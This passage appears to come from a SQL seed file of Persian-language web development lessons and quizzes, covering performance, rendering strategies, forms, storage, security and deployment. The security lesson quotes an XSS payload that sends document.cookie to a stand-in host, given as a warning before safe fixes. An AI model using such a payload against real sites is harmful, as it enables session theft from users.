کتابخانه‌ها اصلاً بسته‌بندی نشوند (که نیازمند ES Module و side-effect-free بودن است) و به‌تعویق‌انداختنِ غیرحیاتی‌ها تا بعد از تعامل کاربر. و همیشه قبل از حذف، اندازه بگیر: bundle analyzer یک نگاه به درخت وابستگی، اغلب چند صد کیلوبایت «وابستگی‌ای که برای یک تابع آوردیم» را لو می‌دهد."},{"k":"h","t":"مثال حل‌شده"},{"k":"code","lang":"html","title":"چک‌لیست اجرایی — ده خطی که سرعت می‌سازند","code":"<!-- ۱+۲) تصویر Hero: اولویت بالا + ابعاد رزرو (ضد CLS) -->\n<img src=\"hero.avif\" width=\"1200\" height=\"630\"\n     fetchpriority=\"high\" alt=\"...\">\n\n<!-- ۳) فونت: swap + preload -->\n<link rel=\"preload\" href=\"vazir-subset.woff2\"\n      as=\"font\" type=\"font/woff2\" crossorigin>\n<style>\n  @font-face {\n    font-family: Vazir;\n    src: url(vazir-subset.woff2) format(''woff2'');\n    font-display: swap;          /* ۴ */\n  }\n</style>\n\n<!-- ۵) اسکریپت غیرحیاتی: بعد از تعامل کاربر -->\n<script>\n  addEventListener(''pointerdown'', () =>\n    import(''./chat-widget.js''), { once: true });\n</script>\n\n<!-- ۶) محتوای زیر خط: lazy -->\n<img src=\"post-7.avif\" loading=\"lazy\" decoding=\"async\"\n     width=\"800\" height=\"450\" alt=\"...\">"},{"k":"list","items":["width و height روی img باعث می‌شود مرورگر قبل از رسیدن فایل، نسبت ابعاد را بداند و فضا رزرو کند — CLS تصویر عملاً صفر می‌شود.","font-display: swap یعنی متن فوراً با فونت جایگزین خوانا شود و فونت اصلی بعداً جایگزین شود — نه صفحه سفید.","import() پویا با once یعنی ویجت چت فقط وقتی کاربر اولین تعامل را کرد دانلود می‌شود — شاید هرگز برای خیلی‌ها دانلود نشود، که دقیقاً هدف است.","decoding=\"async\" به مرورگر اجازه می‌دهد decode تصویر را از نخ اصلی بردارد — برای تصاویر غیرحیاتی رایگان است."]},{"k":"def","term":"بودجه عملکرد (Performance Budget)","t":"سقف‌های عددیِ توافق‌شده‌ی تیم برای وزن صفحه: مثلاً «JS کل زیر ۲۰۰KB، تصویر Hero زیر ۱۵۰KB، LCP زیر ۲٫۵ ثانیه» — که در CI بررسی می‌شود و عبور از آن‌ها، merge را می‌شکند مثل شکستن تست. منطقش این است که کندی هیچ‌وقت با یک تصمیم بزرگ نمی‌آید؛ با صد تصمیم کوچکِ «فقط این یکی کتابخانه» می‌آید. بودجه، آن صد تصمیم را به یک سوال تبدیل می‌کند: جا داریم؟"},{"k":"table","head":["معیار","خوب","منشأ معمول خرابی","درمان اول"],"rows":[["LCP","زیر ۲٫۵ ثانیه","تصویر Hero سنگین، سرور کند","AVIF + fetchpriority + preload"],["INP","زیر ۲۰۰ میلی‌ثانیه","JS طولانی روی نخ اصلی","شکستن کار، Splitting، Worker"],["CLS","زیر ۰٫۱","تصویر/فونت/تبلیغ بدون فضا","width/height، font-swap رزرو‌دار"]]},{"k":"warn","title":"دام رایج","t":"بهینه‌سازی بدون اندازه‌گیری — کشیدن lazy روی تصویر Hero (LCP را خراب می‌کند!) یا minify فشرده‌تر وقتی ۶۰٪ صفحه فونت اضافه است. اول در Lighthouse و CrUX ببین کدام معیار قرمز است و گلوگاه واقعی کجاست؛ بعد فقط همان را درمان کن. بهینه‌سازیِ جایی که گلوگاه نیست، حس پیشرفت می‌دهد ولی عددی را تکان نمی‌دهد."},{"k":"tip","title":"نکته حرفه‌ای","t":"Lighthouse را با تنظیمات Slow 4G و CPU چهار برابر کندتر اجرا کن — نه با اینترنت دفتر و لپ‌تاپ قوی. و عددی که واقعاً مهم است، Field Data در گزارش CrUX است (تجربه کاربران واقعی)، نه Lab Data خودت؛ چون کاربر واقعی موبایل میان‌رده دارد و شبکه‌ای که تو هیچ‌وقت ندیده‌ای."},{"k":"h","t":"جمع‌بندی درس"},{"k":"list","items":["سه معیار، سه جنس مشکل: LCP (بایت)، INP (CPU)، CLS (نظم) — اول تشخیص، بعد درمان.","تصاویر: فرمت مدرن، ابعاد واقعی، lazy برای زیر خط؛ فونت: WOFF2 زیرمجموعه‌شده با swap.","JS گران‌ترین بایت است — Splitting و به‌تعویق‌انداختن؛ و همه‌چیز زیر سقف بودجه عملکرد در CI."]}]'::jsonb, '[{"q":"چرا loading=\"lazy\" روی تصویر Hero اشتباه است؟","opts":["اصلاً اشتباه نیست","Hero همان LCP است — به‌تعویق‌انداختنش دقیقاً مهم‌ترین معیار را خراب می‌کند؛ Hero باید با اولویت بالا زود برسد و بقیه lazy شوند","فقط در موبایل بد است","مرورگر نادیده می‌گیرد"],"ans":1,"why":"lazy یعنی «دیرتر دانلود کن» — برای محتوایی که معیارش «چقدر زود رسید»، ضدعمل است. fetchpriority=\"high\" برای Hero و lazy برای بقیه، تقسیم کار درست است."},{"q":"چرا یک کیلوبایت جاوااسکریپت از یک کیلوبایت تصویر گران‌تر است؟","opts":["فشرده‌تر است","JS باید پارس، کامپایل و اجرا شود — روی همان نخی که تعامل را هم جواب می‌دهد؛ تصویر فقط decode می‌شود و می‌تواند جدا انجام شود","حجمش بیشتر است","کش نمی‌شود"],"ans":1,"why":"هزینه JS روی نخ اصلی است — مستقیماً INP و TTI را می‌خورد. تصویر را GPU و decode غیرهمگام تحمل می‌کنند؛ ولی ۵۰۰KB فریم‌ورک یعنی میلی‌ثانیه‌ها نخ اصلیِ اشغال‌شده روی موبایل میان‌رده."},{"q":"CLS چگونه با width/height روی تصویر حل می‌شود؟","opts":["تصویر سریع‌تر می‌آید","مرورگر قبل از دانلود، نسبت ابعاد را می‌داند و فضا رزرو می‌کند — پس وقتی تصویر رسید، هیچ‌چیز جابه‌جا نمی‌شود","تصویر فشرده‌تر است","فقط در Chrome کار می‌کند"],"ans":1,"why":"CLS یعنی جابه‌جاییِ محتوای زیر پای کاربر. رزرو فضا یعنی جابه‌جایی قبل از رسیدن تصویر اتفاق افتاده — یعنی هیچ‌وقت جلوی چشم کاربر اتفاق نمی‌افتد."}]'::jsonb),
('web-r10', 'web', 'استراتژی‌های رندر؛ SPA، SSR، SSG و انتخاب درست', 60, 10, '[{"k":"p","t":"«فریم‌ورک چیست؟» سوال اشتباه است؛ سوال درست این است: HTML هر صفحه، کجا و کی ساخته می‌شود — در مرورگر کاربر، در سرور به‌ازای هر درخواست، یا یک‌بار هنگام build؟ هر جواب، معامله‌ای متفاوت با SEO، سرعت اولیه و پیچیدگی زیرساخت است — و فریم‌ورک‌ها فقط این انتخاب‌ها را بسته‌بندی می‌کنند."},{"k":"h","t":"CSR؛ SPA کلاسیک و معامله‌اش"},{"k":"p","t":"در رندر سمت کلاینت، سرور یک پوسته خالی می‌فرستد و مرورگر با جاوااسکریپت صفحه را می‌سازد. بردهایش واقعی‌اند: بعد از بار اول، ناوبری بین صفحه‌ها آنی و بدون رفرش است، سرور فقط API سرو می‌دهد و تیم فرانت مستقل deploy می‌کند. بهایش: صفحه اول تا اجرا نشدن JS خالی است (LCP کندتر)، موتور جست‌وجو برای دیدن محتوا باید JS اجرا کند و هر کاربر، بار ساخت صفحه را روی دستگاه خودش می‌پردازد. برای داشبورد و اپلیکیشنِ بعد از لاگین — جایی که SEO معنا ندارد و تعامل زیاد است — هنوز انتخاب عالی است."},{"k":"h","t":"SSR و SSG؛ بازگشت HTML به سرور"},{"k":"p","t":"در SSG (تولید ایستا)، صفحه‌ها هنگام build ساخته می‌شوند و به‌صورت فایل HTML از CDN سرو می‌شوند — سریع‌ترین حالت ممکن و بی‌نیاز از سرور پویا؛ ولی فقط برای محتوایی که هنگام build معلوم است (مستندات، وبلاگ، صفحات فرود). در SSR، سرور به‌ازای هر درخواست HTML را می‌سازد — محتوا همیشه تازه است ولی هر بازدید هزینه CPU دارد و TTFB به سرعت سرور وابسته می‌شود. ISR حد وسط هوشمند Next.js است: صفحه ایستا ساخته و سرو می‌شود و بعد از انقضایش، در پس‌زمینه بازسازی می‌شود — سرعت SSG با تازگیِ تقریبی SSR."},{"k":"h","t":"Hydration و جهت‌گیری جدید؛ Islands و RSC"},{"k":"p","t":"مشترکِ همه این‌ها یک مرحله است: Hydration — لحظه‌ای که جاوااسکریپت به HTML ایستا وصل می‌شود و صفحه تعامل‌پذیر می‌شود. مشکل کلاسیک: برای تعاملِ یک دکمه، JS کل صفحه دانلود و اجرا می‌شد. پاسخ‌های مدرن: معماری Islands (مثل Astro) که فقط «جزیره‌های» تعاملی را hydrate می‌کند و بقیه HTML خالص می‌ماند، و React Server Components که مرز را به‌کل جابه‌جا می‌کند: کامپوننت‌های سرور اصلاً به مرورگر نمی‌آیند و فقط خروجی‌شان می‌آید — JS ارسالی به‌شدت کمتر. جهت صنعت روشن است: HTML بیشتر در سرور، جاوااسکریپت کمتر در مرورگر — و انتخاب امروز یعنی پیدا کردن نقطه درست این طیف برای محصول خودت."},{"k":"h","t":"مثال حل‌شده"},{"k":"code","lang":"tsx","title":"چهار استراتژی در یک فریم‌ورک (Next.js App Router)","code":"// ۱) SSG — هنگام build؛ برای محتوای ثابت\n//    خروجی: HTML ایستا روی CDN، صفر کار سرور\nexport default async function AboutPage() {\n  return <h1>درباره ما</h1>;     // بدون داده پویا = ایستا\n}\n\n// ۲) SSR — به‌ازای هر درخواست؛ همیشه تازه\nexport const dynamic = ''force-dynamic'';\nexport default async function ProfilePage() {\n  const user = await db.user.me();   // هر بازدید، داده تازه\n  return <h1>{user.name}</h1>;\n}\n\n// ۳) ISR — ایستا + بازسازی پس‌زمینه هر ۶۰ ثانیه\nexport const revalidate = 60;\nexport default async function ProductPage({ params }) {\n  const p = await db.product.find(params.id);\n  return <ProductView p={p} />;\n}\n\n// ۴) CSR — پوسته + داده در مرورگر (کامپوننت کلاینت)\n''use client'';\nexport default function CartDrawer() {\n  const [open, setOpen] = useState(false);\n  const cart = useCart();            // state زنده مرورگر\n  return open ? <CartList {...cart} /> : null;\n}"},{"k":"list","items":["بدون هیچ علامت داده پویا، فریم‌ورک صفحه را هنگام build می‌سازد — SSG پیش‌فرض است چون ارزان‌ترین حالت است.","force-dynamic یعنی هر درخواست، اجرای کامل — مناسب صفحات شخصی‌سازی‌شده که هیچ‌دو کاربر یک چیز نبینند.","revalidate = 60: کاربر اول نسخه کش‌شده (سریع) را می‌گیرد و بعد از ۶۰ ثانیه، درخواست بعدی بازسازی را در پس‌زمینه تحریک می‌کند.","''use client'' مرز hydration را اعلام می‌کند — فقط این کامپوننت و وابستگی‌هایش به مرورگر می‌آیند؛ بقیه درخت، HTML سرور می‌ماند."]},{"k":"def","term":"Hydration","t":"فرایند وصل‌شدن جاوااسکریپت به HTML رندرشده: مرورگر DOM را از HTML می‌سازد (کاربر محتوا را می‌بیند) و بعد، جاوااسکریپت اجرا می‌شود، درخت مجازی را به DOM می‌چسباند و رویدادها را فعال می‌کند. فاصله «می‌بینم» تا «می‌توانم کلیک کنم» همان پنجره hydration است — و بهینه‌سازی مدرن وب، در واقع کوچک‌کردن یا حذف این پنجره برای بخش‌های غیرتعاملی است."},{"k":"table","head":["استراتژی","HTML کجا ساخته می‌شود","مناسب برای","محدودیت اصلی"],"rows":[["CSR/SPA","مرورگر، با JS","داشبورد، اپ بعد از لاگین","صفحه اول کند، SEO ضعیف"],["SSG","هنگام build","وبلاگ، مستندات، فرود","تازگی محتوا = rebuild"],["SSR","سرور، هر درخواست","شخصی‌سازی زنده","هزینه CPU هر بازدید"],["ISR","build + بازسازی دوره‌ای","فروشگاه، خبر","لحظه‌هایی داده قدیمی"]]},{"k":"warn","title":"دام رایج","t":"انتخاب SPA برای سایت محتوامحور «چون مدرن است» — و بعد ماه‌ها جنگیدن با SEO و سرعت اولیه. معیار ساده: اگر کاربر بدون لاگین می‌آید و گوگل باید محتوا را ببیند، HTML باید در سرور ساخته شود. SPA برای اپلیکیشن است نه برای انتشار محتوا — و تشخیص این مرز، نیمی از معماری فرانت‌اند است."},{"k":"tip","title":"نکته حرفه‌ای","t":"به‌جای انتخاب ایدئولوژیک، از داده شروع کن: صفحاتت را به سه دسته تقسیم کن — ثابت، نیمه‌پویا و شخصی‌سازی‌شده — و برای هر دسته استراتژی مناسبش را بگذار (ترکیب‌ها مجازند!). اکثر محصول‌های واقعی ترکیب‌اند: فرود و وبلاگ SSG، کاتالوگ ISR، داشبورد CSR — و فریم‌ورک‌های مدرن دقیقاً برای همین مخلوط ساخته شده‌اند."},{"k":"h","t":"جمع‌بندی درس"},{"k":"list","items":["سوال معماری: HTML کجا و کی ساخته می‌شود — مرورگر (CSR)، هر درخواست (SSR) یا build (SSG/ISR).","محتوای عمومی = HTML سمت سرور برای SEO و LCP؛ اپلیکیشنِ بعد از ورود = SPA برای تعامل بی‌درنگ.","جهت صنعت: HTML بیشتر در سرور، JS کمتر در مرورگر — Islands و Server Components پاسخ‌های مدرن‌اند."]}]'::jsonb, '[{"q":"چرا SSG سریع‌ترین حالت ممکن است؟","opts":["JS ندارد","HTML از قبل ساخته شده و از CDN — نزدیک‌ترین نقطه به کاربر — بدون هیچ محاسبه سرور سرو می‌شود","فقط برای سایت کوچک","مرورگر کش می‌کند"],"ans":1,"why":"هیچ کاری هنگام درخواست انجام نمی‌شود: فایل آماده است و CDN فقط کپی‌اش را می‌فرستد. TTFB نزدیک به صفر و مقیاس‌پذیری تقریباً رایگان — به‌شرطی که محتوا هنگام build معلوم باشد."},{"q":"ISR چه معامله‌ای می‌کند؟","opts":["سرعت SSR با هزینه SSG","سرعت و ارزانی صفحه ایستا را می‌دهد ولی تازگی محتوا تاخیر دارد (به اندازه دوره بازسازی)","کاملاً تازه است","نیاز به دیتابیس ندارد"],"ans":1,"why":"revalidate یعنی «تا ۶۰ ثانیه قدیمی بودن اشکال ندارد» — برای فروشگاه و خبر عالی است، برای موجودی لحظه‌ای نه. انتخاب ISR یعنی تعریف صریح «چقدر قدیمی بودن مجاز است»."},{"q":"Hydration چه فاصله‌ای را پر می‌کند؟","opts":["بین دانلود و کش","بین «دیدن صفحه» (HTML) و «تعامل‌پذیر شدنش» (JS) — و هدف بهینه‌سازی مدرن، کوچک‌کردن این فاصله است","بین سرور و CDN","فقط در موبایل"],"ans":1,"why":"کاربر دکمه را می‌بیند ولی چند صد میلی‌ثانیه کلیک بی‌اثر است — تجربه «مرده». Islands و RSC با نیاوردن JS غیرضروری، این پنجره را برای اکثر صفحه حذف می‌کنند."}]'::jsonb),
('web-c1', 'web', 'متغیرهای CSS و Design Token؛ یک زبان مشترک برای طراحی', 40, 11, '[{"k":"p","t":"وقتی رنگ سازمانی در ۴۰ جا تکرار شده، تغییرش یعنی ۴۰ جست‌وجو و جایگزینی و ۳۹ فراموشی. متغیرهای CSS (--brand: #0a6) یک بار تعریف و همه‌جا ارجاع می‌شوند — و وقتی در :root تغییر کنند، کل سایت به‌روز است. Design Token نسخه مهندسی همین ایده است: نام‌های معناگرا (--color-danger نه --red) که تیم طراحی و توسعه را به یک واژگان مشترک می‌رسانند و تم تیره/روشن را با تغییر یک دسته متغیر ممکن می‌کنند."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["--space-4 و --font-lg — نام بر اساس نقش، نه ظاهر",":root برای سراسری؛ scope محلی برای کامپوننت","تم تیره: [data-theme=dark] { --bg: #0b1220; } — فقط متغیرها عوض می‌شوند","var(--brand, #06c) — مقدار جایگزین برای روز مبادا","فریم‌ورک‌ها (Tailwind) در دل‌شان همین توکن‌ها را دارند"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"css","title":"تم با یک دسته متغیر","code":":root {\n  --bg: #f7f9fc;\n  --text: #16233a;\n  --brand: #0a6e5c;\n  --radius: 10px;\n}\n\n[data-theme=''dark''] {\n  --bg: #0b1220;\n  --text: #e9f1fa;\n  --brand: #3fd8b6;\n}\n\nbody {\n  background: var(--bg);\n  color: var(--text);\n}\n\n.card {\n  border-radius: var(--radius);\n  border: 1px solid color-mix(in srgb, var(--text) 12%, transparent);\n}"},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: --space-4 و --font-lg — نام بر اساس نقش، نه ظاهر بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"چرا نام‌گذاری معناگرا (--color-danger) بهتر از ظاهری (--red) است؟","opts":["کوتاه‌تر است","چون وقتی قرمزِ خطر به نارنجی تغییر کرد، نامش هنوز درست می‌ماند و قصد طراحی را منتقل می‌کند","سریع‌تر است","فقط سلیقه"],"ans":1,"why":"توکن نقش را می‌گوید نه پیکسل را — و وقتی نقش ثابت است و ظاهر عوض می‌شود، فقط یک تعریف تغییر می‌کند و ۴۰ مصرف‌کننده نه."}]'::jsonb),
('web-c2', 'web', 'فرم‌ها؛ از label تا اعتبارسنجی دوطرفه', 45, 12, '[{"k":"p","t":"فرم جایی است که کاربر واقعاً با محصولت حرف می‌زند — و پرخطاترین جای رابط‌هاست. پایه‌ها: هر input یک label با for (نه placeholder به‌جای label)، type درست (email، tel، number که کیبورد موبایل را هم درست می‌کنند) و autocomplete معنادار. اعتبارسنجی بومی HTML (required، pattern، minlength) رایگان است و حتی بدون JS کار می‌کند — ولی قانون طلایی این است: اعتبارسنجی کلاینت برای راحتی کاربر است، برای امنیت هرگز کافی نیست؛ سرور باید همه‌چیز را دوباره چک کند."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["label با for — placeholder جایگزین label نیست (محو می‌شود)","type=email کیبورد و اعتبارسنجی رایگان می‌دهد","novalidate فقط وقتی UX خطای خودت واقعاً بهتر است","پیام خطا کنار فیلد، با id و aria-describedby","سرور: دوباره اعتبارسنجی — همیشه؛ کلاینت قابل‌دورزدن است"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"html","title":"فرمی که هم کاربر و هم سرور راضی‌اند","code":"<form action=\"/register\" method=\"post\" novalidate>\n  <div class=\"field\">\n    <label for=\"email\">ایمیل</label>\n    <input type=\"email\" id=\"email\" name=\"email\"\n           required autocomplete=\"email\"\n           aria-describedby=\"email-err\">\n    <p class=\"err\" id=\"email-err\" hidden>ایمیل معتبر نیست</p>\n  </div>\n  <button type=\"submit\">ثبت‌نام</button>\n</form>\n\n<script>\n  form.addEventListener(''submit'', e => {\n    if (!form.reportValidity()) e.preventDefault();\n    // و در سرور: دوباره همان ruleها — بدون استثنا\n  });\n</script>"},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: label با for — placeholder جایگزین label نیست (محو می‌شود) بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"چرا اعتبارسنجی کلاینت برای امنیت کافی نیست؟","opts":["کند است","چون به‌راحتی دور زده می‌شود — با غیرفعال‌کردن JS یا ساخت درخواست مستقیم؛ پس سرور باید مستقل و دوباره همه ورودی را اعتبارسنجی کند","مرورگرها متفاوت‌اند","فقط ظاهر است"],"ans":1,"why":"هر چیزی که در مرورگر اتفاق می‌افتد، در قلمرو کاربر است — و کاربر می‌تواند هر check را بپرد. اعتبارسنجی کلاینت هدیه UX است؛ اعتبارسنجی سرور، دیوار امنیتی."}]'::jsonb),
('web-c3', 'web', 'ذخیره‌سازی کلاینت؛ localStorage، IndexedDB و Cache API', 40, 13, '[{"k":"p","t":"مرورگر سه قفسه برای داده دارد و انتخاب اشتباه، یا داده را گم می‌کند یا رابط را کند. localStorage ساده و همگام است — عالی برای تنظیمات کوچک (تم، زبان) ولی با سقف ~۵MB و بلاک‌کردن نخ اصلی در خواندن/نوشتن‌های بزرگ. IndexedDB دیتابیس واقعی مرورگر است: نامتقارن، با ایندکس و صدها مگابایت — برای داده‌های ساختاریافته آفلاین. و Cache API مخصوص ذخیره درخواست/پاسخ HTTP است — قلب Service Worker و PWA. کوکی را هم فراموش نکن: تنها مخزنی که خودکار با درخواست می‌رود — و تنها گزینه برای داده‌های احراز هویت."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["localStorage: کلید/مقدار، همگام، ~5MB — فقط تنظیمات کوچک","IndexedDB: نامتقیرن و ایندکس‌دار — داده آفلاین واقعی","Cache API: کشِ درخواست‌ها برای Service Worker","همه‌چیز قابل‌پاک‌کردن توسط کاربر است — داده حیاتی را sync کن","اندازه کوکی با هر درخواست می‌رود — کوچک نگهش دار"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"js","title":"سه قفسه، سه کاربرد","code":"// تنظیمات کوچک — localStorage\nlocalStorage.setItem(''theme'', ''dark'');\n\n// داده ساختاریافته — IndexedDB (با idb، ساده‌تر)\nconst db = await openDB(''notes'', 1, {\n  upgrade(d) { d.createObjectStore(''items'', { keyPath: ''id'' }); },\n});\nawait db.put(''items'', { id: 1, text: ''...'', updatedAt: Date.now() });\n\n// کش شبکه — Cache API (داخل Service Worker)\nself.addEventListener(''fetch'', (e) => {\n  e.respondWith(\n    caches.match(e.request).then(hit =>\n      hit || fetch(e.request))\n  );\n});"},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: localStorage: کلید/مقدار، همگام، ~5MB — فقط تنظیمات کوچک بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"برای ذخیره پیش‌نویس آفلاینِ یک ویرایشگر متن، کدام مناسب است؟","opts":["localStorage","IndexedDB — داده ساختاریافته و حجیم که باید بدون شبکه زنده بماند و جست‌وجو شود","کوکی","هیچ‌کدام"],"ans":1,"why":"localStorage همگام است و در حجم بالا رابط را فریز می‌کند؛ کوکی با هر درخواست می‌رود که بی‌معنی است. IndexedDB دقیقاً برای همین سناریو ساخته شده."}]'::jsonb),
('web-c4', 'web', 'امنیت فرانت؛ XSS، CSP و Clickjacking', 45, 14, '[{"k":"p","t":"فرانت‌اند خط مقدم دو حمله رایج است. XSS یعنی محتوای مخرب کاربر به‌جای نمایش، اجرا شود — درمان اصلی، escape خودکار فریم‌ورک‌هاست تا وقتی که خودت در را باز نکنی (innerHTML با داده کاربر، dangerouslySetInnerHTML). لایه بعدی CSP است: سربرگی که به مرورگر می‌گوید اسکریپت فقط از منابع مشخص و inline ممنوع — پس حتی تزریق موفق، اجرا نمی‌شود. و Clickjacking یعنی صفحه‌ات را نامرئی زیر دکمه‌ای که کاربر فکر می‌کند چیز دیگری است بگذارند — درمانش X-Frame-Options یا frame-ancestors در CSP است."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["پیش‌فرض فریم‌ورک‌ها امن است — درهای فرار (innerHTML) را با داده کاربر باز نکن","CSP: script-src ''self'' — حتی تزریق موفق اجرا نمی‌شود","X-Frame-Options: DENY یا frame-ancestors — ضد Clickjacking","rel=\"noopener\" برای لینک‌های target=_blank","وابستگی‌ها را audit کن — supply chain حمله واقعی است"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"js","title":"دو خط خطرناک و جایگزین‌هایشان","code":"// ❌ محتوای کاربر اجرا می‌شود:\ncommentBox.innerHTML = comment.body;\n// کامنت: <img src=x onerror=\"fetch(''evil.co?c=''+document.cookie)\">\n\n// ✓ متن، فقط متن:\ncommentBox.textContent = comment.body;\n\n// ✓ اگر واقعاً HTML لازم است (markdown) — sanitize:\ncommentBox.innerHTML = DOMPurify.sanitize(markdown(comment.body));\n\n// و در سرور، هدر دفاع عمیق:\n// Content-Security-Policy: default-src ''self'';\n//   script-src ''self''; frame-ancestors ''none''"},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: پیش‌فرض فریم‌ورک‌ها امن است — درهای فرار (innerHTML) را با داده کاربر باز نکن بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"CSP چگونه حتی XSS موفق را خنثی می‌کند؟","opts":["کد را پاک می‌کند","با ممنوع‌کردن اسکریپت inline و منابع ناشناس، مرورگر اجرای payload تزریق‌شده را رد می‌کند — دفاع لایه دوم بعد از escape","رمزنگاری می‌کند","کوکی را می‌بندد"],"ans":1,"why":"escape جلوی ورود را می‌گیرد؛ CSP جلوی اجرا را. وقتی یکی خطا کند (و بالاخره می‌کند)، دیگری می‌ایستد — این یعنی دفاع عمیق."}]'::jsonb),
('web-c5', 'web', 'Vite و ساخت مدرن؛ از npm init تا باندل بهینه', 40, 15, '[{"k":"p","t":"دوره کپی‌کردن فایل‌های JS در HTML تمام شده: ابزار build ماژول‌ها را به هم می‌دوزد، Tree Shaking می‌کند، TS را کامپایل و خروجی را hash‌دار و کش‌پذیر می‌کند. Vite در توسعه سرور dev فوری است (با ESM بومی — بدون باندل اولیه) و برای تولید از Rollup برای باندل بهینه استفاده می‌کند. سه فرمان کافی‌اند: create برای شروع، dev برای توسعه با Hot Reload و build برای خروجی تولید که hash در نام فایل‌ها یعنی کش‌شکنی خودکار — هر نسخه جدید، URL جدید."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["npm create vite@latest — شروع ۱۰ ثانیه‌ای","dev: باندل اولیه ندارد؛ HMR تغییر را در میلی‌ثانیه می‌رساند","build: خروجی hash‌دار → کش بی‌نهایت امن","import() پویا = Code Splitting خودکار","aliasها و env (VITE_*) را از روز اول مرتب کن"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"bash","title":"چرخه کامل یک پروژه Vite","code":"npm create vite@latest my-app -- --template react-ts\ncd my-app && npm install\n\nnpm run dev\n# → Local: http://localhost:5173\n# تغییر در کد = به‌روزرسانی میلی‌ثانیه‌ای بدون از‌دست‌رفتن state\n\nnpm run build\n# dist/assets/index-BqgMxJ8.js   ← hash = کش‌شکنی\n# dist/assets/index-C3o16dv.css\n\nnpm run preview   # تست خروجی تولید، محلی"},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: npm create vite@latest — شروع ۱۰ ثانیه‌ای بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"چرا نام فایل‌های خروجی build hash دارند؟","opts":["زیبایی","تا با هر تغییر محتوا، URL عوض شود و مرورگرها هرگز نسخه قدیمیِ کش‌شده را سرو نکنند — کش بی‌نهایت بدون نگرانی","امنیت","فشرده‌سازی"],"ans":1,"why":"می‌توانی برای همه assets کش یک‌ساله بگذاری؛ چون فایل تغییرکرده نامش هم تغییر می‌کند و URL قدیمی فقط برای محتوای قدیمی می‌ماند."}]'::jsonb),
('web-c6', 'web', 'انتشار و CDN؛ از dist تا دنیا', 35, 16, '[{"k":"p","t":"سایت استاتیک یعنی فقط فایل — و فایل را همه‌جا می‌شود سرو کرد. پلتفرم‌های مدرن (Netlify، Vercel، Cloudflare Pages) یک Git push را به deploy تبدیل می‌کنند: build می‌گیرند، خروجی را در صدها لبه CDN پخش می‌کنند، HTTPS خودکار می‌دهند و Preview deploy برای هر Pull Request می‌سازند. CDN یعنی کاربر فایل را از نزدیک‌ترین شهر می‌گیرد — برای کاربران ایرانیِ محتوای فارسی، تفاوت TTFB بین لبه محلی و سرور یک‌قاره‌آن‌طرف‌تر، چند صد میلی‌ثانیه است."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["اتصال Git: هر push → build → deploy خودکار","Preview Deploy برای هر PR — قبل از merge ببین","SPA: همه مسیرها به index.html — redirect لازم است","HTTPS خودکار و رایگان — بهانه‌ای نمانده","فایل‌های hash‌دار: Cache-Control بلند؛ HTML: کوتاه"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"bash","title":"تنظیمات یک SPA روی پلتفرم ابری","code":"# netlify.toml\n[build]\n  command = \"npm run build\"\n  publish = \"dist\"\n\n# SPA fallback — بدون این، /courses/42 خطای 404 است\n[[redirects]]\n  from = \"/*\"\n  to = \"/index.html\"\n  status = 200\n\n# و هدرهای کش:\n[[headers]]\n  for = \"/assets/*\"\n  [headers.values]\n    Cache-Control = \"public, max-age=31536000, immutable\""},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: اتصال Git: هر push → build → deploy خودکار بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"چرا SPA بدون redirect rule به /courses/42 خطای 404 می‌دهد؟","opts":["باگ فریم‌ورک","چون چنین فایلی روی سرور وجود ندارد — مسیریابی سمت کلاینت است؛ پس سرور باید همه مسیرها را به index.html بفرستد تا روتر تصمیم بگیرد","سرور کند است","کش مشکل دارد"],"ans":1,"why":"در SSR خود سرور مسیر را می‌فهمد؛ در SPA فایل فیزیکی فقط index.html است و بقیه «مجازی» — و سرور باید این قرارداد را بشناسد."}]'::jsonb)
